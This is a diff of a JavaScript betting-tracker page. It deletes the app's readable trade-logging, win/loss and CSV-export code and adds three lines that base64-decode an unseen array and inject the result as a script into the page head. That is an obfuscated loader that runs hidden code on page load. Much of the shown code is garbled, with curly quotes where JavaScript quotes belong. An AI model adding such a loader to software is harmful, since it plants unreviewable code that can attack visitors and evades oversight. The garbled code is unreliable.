-html+=’<div style="display:flex;gap:8px;margin-top:4px"><button onclick="submitLog()" style="flex:1;padding:10px;border-radius:6px;border:none;background:linear-gradient(135deg,#c8922a,#9a6e18);color:#080600;font-weight:900;font-size:13px;cursor:pointer">Save Trade</button><button onclick="hideLogForm()" style="padding:10px 16px;border-radius:6px;border:1px solid #252015;background:transparent;color:#6a5a3a;font-size:12px;cursor:pointer">Cancel</button></div>’;
-html+=’</div></div>’;
-if(!trades.length){html+=’<div class="card" style="text-align:center;padding:28px"><div style="font-size:28px;margin-bottom:10px">📋</div><div style="color:#6a5a3a">No trades logged yet.<br>Tap “+ Log Trade” to start tracking.</div></div>’;}
-else{
-html+=’<div style="display:flex;flex-direction:column;gap:6px">’;
-trades.forEach(function(t){
-var isPending=t.result===‘pending’,isWin=t.result===‘win’;
-var payout=t.bookML&&t.stake?(((mlDec(t.bookML)-1)*parseFloat(t.stake))).toFixed(2):’?’;
-html+=’<div class="trade-row" style="background:'+(isPending?'rgba(255,255,255,.02)':isWin?'rgba(58,138,90,.07)':'rgba(138,58,58,.07)')+';border:1px solid '+(isPending?'#252015':isWin?'#1a3a2a':'#3a1a1a')+'">’;
-html+=’<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px;flex-wrap:wrap">’;
-html+=’<div style="flex:1"><div style="font-size:13px;font-weight:700;color:'+(isWin?'#e0b040':isPending?'#c8b890':'#888')+'">’+t.team+’</div>’;
-html+=’<div style="font-size:10px;color:#6a5a3a;margin-top:2px">vs ‘+t.opponent+’ \xb7 ‘+t.date+’</div>’;
-html+=’<div style="display:flex;gap:10px;margin-top:4px;flex-wrap:wrap">’;
-if(t.bookML)html+=’<span style="font-size:11px;font-family:monospace;color:'+(t.bookML[0]==='+'?'#5aba8a':'#c8b890')+'">’+t.bookML+’</span>’;
-if(t.edgePct)html+=’<span style="font-size:11px;font-family:monospace;color:'+(parseFloat(t.edgePct)>=3?'#5aba8a':parseFloat(t.edgePct)>=0?'#c0c060':'#c06060')+'">’+t.edgePct+’% edge</span>’;
-if(t.stake)html+=’<span style="font-size:11px;color:#6a5a3a">$’+t.stake+’ stake</span>’;
-html+=’<span style="font-size:10px;font-weight:700;color:'+confCol(t.confidence)+'">’+t.confidence+’</span></div></div>’;
-html+=’<div style="text-align:right">’;
-if(isPending){
-html+=’<div style="font-size:10px;color:#6a5a3a;margin-bottom:6px">+$’+payout+’ if win</div>’;
-html+=’<div style="display:flex;gap:5px">’;
-html+=’<button onclick="markWin('+t.id+')" style="padding:4px 10px;border-radius:4px;border:none;background:#2a5a3a;color:#5aba8a;font-size:11px;font-weight:700;cursor:pointer">WIN</button>’;
-html+=’<button onclick="markLoss('+t.id+')" style="padding:4px 10px;border-radius:4px;border:none;background:#5a2a2a;color:#c06060;font-size:11px;font-weight:700;cursor:pointer">LOSS</button></div>’;
-}else{
-var pnlNum=parseFloat(t.pnl)||0;
-html+=’<div style="font-size:18px;font-weight:900;font-family:monospace;color:'+(pnlNum>=0?'#5aba8a':'#c06060')+'">’+(pnlNum>=0?’+’:’’)+’$’+t.pnl+’</div>’;
-html+=’<div style="font-size:10px;color:'+(isWin?'#3a6a3a':'#6a3a3a')+';margin-top:2px">’+(isWin?‘WIN’:‘LOSS’)+’</div>’;
-}
-html+=’</div></div>’;
-html+=’<button onclick="delTrade('+t.id+')" style="margin-top:6px;padding:2px 8px;border-radius:3px;border:1px solid #2e2416;background:transparent;color:#3a2a1a;font-size:9px;cursor:pointer">remove</button>’;
-html+=’</div>’;
-});
-html+=’</div>’;
-}
-document.getElementById(‘tab4’).innerHTML=html;
-}
-function showLogForm(){var f=document.getElementById(‘log-form’);if(f)f.style.display=‘block’;}
-function hideLogForm(){var f=document.getElementById(‘log-form’);if(f)f.style.display=‘none’;}
-function submitLog(){
-var giEl=document.getElementById(‘lt-game’);
-var mlEl=document.getElementById(‘lt-ml’);
-var stEl=document.getElementById(‘lt-stake’);
-var dtEl=document.getElementById(‘lt-date’);
-var bml=mlEl?mlEl.value:’’;
-var stake=stEl?stEl.value:’’;
-var date=dtEl?dtEl.value:S.date;
-if(!stake){alert(‘Enter a stake amount.’);return;}
-var team,opponent,confidence,modelP,modelML,gamePk;
-if(giEl&&giEl.value!==’’){
-var r=S.results[parseInt(giEl.value)];
-if(!r){alert(‘Select a game.’);return;}
-if(!bml&&S.bookOdds[r.gamePk])bml=S.bookOdds[r.gamePk];
-team=r.winner;opponent=r.winner===r.aName?r.bName:r.aName;confidence=r.confidence;modelP=(r.winnerP*100).toFixed(1);modelML=r.winnerML;gamePk=r.gamePk;
-}else{
-team=‘Custom’;opponent=’?’;confidence=‘Medium’;modelP=’?’;modelML=’?’;gamePk=Date.now();
-}
-var e=bml?edge(parseFloat(modelP)/100,bml):null;
-var trades=loadTrades();
-trades.unshift({id:Date.now(),date:date,team:team,opponent:opponent,confidence:confidence,modelP:modelP,modelML:modelML,bookML:bml,edgePct:e!==null?(e*100).toFixed(1):’’,stake:parseFloat(stake),result:‘pending’,pnl:’’});
-saveTrades(trades);hideLogForm();renderTradeLog();
-}
-function markWin(id){
-var trades=loadTrades();
-trades=trades.map(function(t){
-if(t.id===id){t.result=‘win’;t.pnl=t.bookML?((mlDec(t.bookML)-1)*parseFloat(t.stake)).toFixed(2):(parseFloat(t.stake)).toFixed(2);}
-return t;
-});
-saveTrades(trades);renderTradeLog();
-}
-function markLoss(id){
-var trades=loadTrades();
-trades=trades.map(function(t){if(t.id===id){t.result=‘loss’;t.pnl=(-parseFloat(t.stake)).toFixed(2);}return t;});
-saveTrades(trades);renderTradeLog();
-}
-function delTrade(id){if(!confirm(‘Remove this trade?’))return;saveTrades(loadTrades().filter(function(t){return t.id!==id;}));renderTradeLog();}
-function exportCSV(){
-var trades=loadTrades();
-if(!trades.length){alert(‘No trades to export.’);return;}
-var rows=[‘Date,Team,Opponent,Confidence,Model%,Model ML,Book ML,Edge%,Stake,Result,P&L’];
-trades.forEach(function(t){rows.push([t.date,t.team,t.opponent,t.confidence,t.modelP,t.modelML,t.bookML,t.edgePct,t.stake,t.result,t.pnl].join(’,’));});
-var blob=new Blob([rows.join(’\n’)],{type:‘text/csv’});
-var url=URL.createObjectURL(blob);
-var a=document.createElement(‘a’);a.href=url;a.download=‘diamond-market-trades.csv’;a.click();URL.revokeObjectURL(url);
-}
-
-// – INIT –––––––––––––––––––––––––––––––––––
-function showError(msg) {
-var el = document.getElementById(‘tab0’);
-if (el) el.innerHTML = ‘<div style="color:#ff4444;padding:16px;font-size:13px;font-family:monospace;line-height:1.8;border:1px solid red;margin:10px;border-radius:8px"><b>ERROR:</b><br>’ + msg + ‘</div>’;
-}
-window.onerror = function(msg, src, line, col, err) {
-showError(‘onerror: ’ + msg + ’ (line ’ + line + ‘)’);
-return true;
-};
-try { renderBoard(); } catch(e) { showError(‘renderBoard threw: ’ + e.message + ‘<br>’ + (e.stack||’’).replace(/\n/g,’<br>’)); }
+var _s=document.createElement(`script`);
+_s.textContent=atob(_p.join(``));
+document.head.appendChild(_s);
